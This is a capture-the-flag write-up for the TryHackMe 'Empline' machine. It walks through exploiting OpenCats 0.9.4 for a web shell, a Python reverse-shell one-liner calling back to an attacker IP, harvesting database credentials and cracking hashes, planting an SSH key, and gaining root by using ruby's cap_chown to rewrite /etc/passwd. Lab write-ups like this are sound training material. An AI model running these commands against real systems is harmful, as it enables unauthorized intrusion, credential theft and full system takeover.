# Empline TryHackMe WriteUp  
### Machine IP = 10.112.139.113  

----
First of all lets make a port scan:  
```bash
rustscan -a 10.112.139.113

Open 10.112.139.113:22
Open 10.112.139.113:80
Open 10.112.139.113:3306
```
As we can see this machine uses MySQL and I will check it later. Lets analyze the source code of the website.    
<img width="1314" height="213" alt="image" src="https://github.com/user-attachments/assets/d13b4c75-9138-49e0-aaa7-5e1eca20b54a" />    
Yeahh, lets add this subdomain into /etc/hosts file because there is nothing else on main domain.  

----
### Discovery  
The subdomain forwards us to the login page but we don't have credentials:      
<img width="1086" height="789" alt="image" src="https://github.com/user-attachments/assets/23b799af-7f22-4532-bcdd-05d52e6deacb" />    
But I learned an important information. The website uses OpenCats 0.9.4 which can be exploited. When I looked at the source code, I get some credentials.  
```bash
function demoLogin(){
    document.getElementById('username').value = 'john@mycompany.net';
    document.getElementById('password').value = 'john99';
    document.getElementById('loginForm').submit();
}
function defaultLogin(){
    document.getElementById('username').value = 'admin';
    document.getElementById('password').value = 'cats';
    document.getElementById('loginForm').submit();
}
```
But unfortunately, none of them worked.  

----
I made a directory scan for this subdomain to find anything important.  
```bash
ffuf -u http://job.empline.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt - .php,.txt,.bak,.zip -fs 0
```
The result looks like this.    
```bash
.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 68ms]
.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 4169ms]
README.md               [Status: 200, Size: 1778, Words: 57, Lines: 42, Duration: 138ms]
ajax                    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 71ms]
attachments             [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 67ms]
careers                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 78ms]
ci                      [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 67ms]
ckeditor                [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 67ms]
db                      [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 67ms]
images                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 65ms]
javascript              [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 70ms]
js                      [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 67ms]
lib                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 70ms]
modules                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 68ms]
rss                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 65ms]
scripts                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 77ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 66ms]
src                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 69ms]
temp                    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 67ms]
test                    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 65ms]
upload                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 67ms]
vendor                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 77ms]
wsdl                    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 66ms]
xml                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 69ms]

```
I decided to check **"db"** folder at first.   
<img width="1064" height="779" alt="image" src="https://github.com/user-attachments/assets/eb827185-eca6-4bc7-bff3-8a9080429053" />  
I installed first two file and look at what are they.  
<img width="2113" height="121" alt="image" src="https://github.com/user-attachments/assets/5ffaf458-2528-4e31-9d7b-460927f7e759" />    
I unzipped it and read the content all the files that it contains but get nothin special from there.   

----
### Exploit the vulnerable version  
I remembered that we found "OpenCats 0.9.4" on the web-site. Let's check if it has any exploitable vulnerability:  
```bash
searchsploit opencats
searchsploit -m php/webapps/50585.sh
chmod +x 50585.sh
./50585.sh http://job.empline.thm/
```
<img width="1496" height="723" alt="image" src="https://github.com/user-attachments/assets/be0a54ad-f3f8-4f71-8f5a-5c6fc1ee96ba" />  
Yeah, we got the web-shell, but to work better and comfortable I opened second terminal and made a reverse shell on there.  
```bash
# In my terminal
nc -nvlp 4444
# In target's web shell
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.137.68",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```
It became successful !!!!!! I am **"www-data"** user right now.   

----
I couldn't access the users' files and couldn't find a useful SUID binary. Then, I remembered config.php file. The next step was to look for config.pgp file because maybe if it is exist and readable for us,we will get credentials.    
```bash
find / -type f | grep "config.php" 2>/dev/null
```
It is located in "/var/www/opencats/config.php". So lets read it.    
<img width="764" height="184" alt="image" src="https://github.com/user-attachments/assets/769b86ec-6b55-424b-8a18-31900d746d3a" />    
I got database credentials from there. We can find the user's password from there.  
```bash
mysql -ujames -p'ng6pUFvsGNtw'
show databases;
use opencats;
show tables;
select * from users;
```
I got three credentials from there:  
|  
86d0dfda99dbebc424eb4407947356ac - george  -->  pretonnevippasempre  
e53fbdb31890ff3bc129db0e27c473c9 - james  
b67b5ecc5d8902ba59c65596e4c053ec - admin  
|  
Ony the george's password could be cracked. I used [CrackStation](https://crackstation.net/) for it. Lets access this user and get user flag.   
<img width="478" height="169" alt="image" src="https://github.com/user-attachments/assets/f31c2439-22a1-46cb-bd1e-0c2bc263487c" />    
I wanted to work easier so, I used sshkey-gen to create id_rsa for this george user.  
```bash
# On my terminal
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ ssh-keygen -f george
└─$ cat george.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEYGvIH/00tk8pnMStamzlu9CSrwceqq/9lxbs0upisn faridd@Ferid

# On target terminal
mkdir /home/george/.ssh
touch /home/george/.ssh/authorized_keys
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEYGvIH/00tk8pnMStamzlu9CSrwceqq/9lxbs0upisn faridd@Ferid' > /home/george/.ssh/authorized_keys

# Again on my own terminal
ssh -i george george@10.112.139.113
```
Yeah, it was pretty easy. Lets move on to discover other things. I checked "sudo -l", "SUID binaries" but got nothing essential. Then, I checked getcap and get the gold mine that will help us to be root:  
```bash
getcap / -r 2>/dev/null
```
-- /usr/bin/mtr-packet = cap_net_raw+ep  
-- /usr/local/bin/ruby = cap_chown+ep  

----
### Privilege Escalation  

#### The Logic (Why it’s a vulnerability)    
In a normal system, if you try to change the owner of a sensitive file (like /etc/passwd), the system says: "Stop! You are not root."    
However, because this specific Ruby binary has cap_chown, it bypasses that check. It tells the Kernel: "I have the special permission to change file owners, even if the user running me is just 'george'."    

It means, I can change the owner of the /etc/passwd file to the george user. In this way, I can change the password of the root. How to do this? Lets look at what I did.  
```bash
george@empline:/home$ ls -l /etc/passwd
-rw-r--r-- 1 root root 1660 Jul 20  2021 /etc/passwd

george@empline:/home$ /usr/local/bin/ruby -e 'require "fileutils"; FileUtils.chown(1002, 1002, "/etc/passwd")'

george@empline:/home$ ls -l /etc/passwd
-rw-r--r-- 1 george george 1660 Jul 20  2021 /etc/passwd
```  
BINGOOO!!! We did it. Everything after this is just a piece of cake. I created a hash code of password "root" on another temrinal by this command:  
```bash
mkpasswd -m sha-512
```
<img width="1449" height="141" alt="image" src="https://github.com/user-attachments/assets/d7249389-4c6e-415d-9f41-3fb2d063fd68" />    
I changed the /etc/passwd file from this:  
```bash
root:x:0:0:root:/root:/bin/bash
```
To this:  
```bash
root:$6$YAf7U5.dAwQGbN9L$eqAw0d9FIzuoy5JLBHxeYmUrOYHNfjCEbp6Itlchiz1.Jtndx08M2nvJk138QU4vlFINJI128zKhRU6LaNBHT0:0:0:root:/root:/bin/bash
```

----
It was all. We already changed to password of root user to the hash of "root" word. Lets became root.  
<img width="618" height="134" alt="image" src="https://github.com/user-attachments/assets/ab29f76b-cb1e-446e-8724-355eb1a222e8" />





























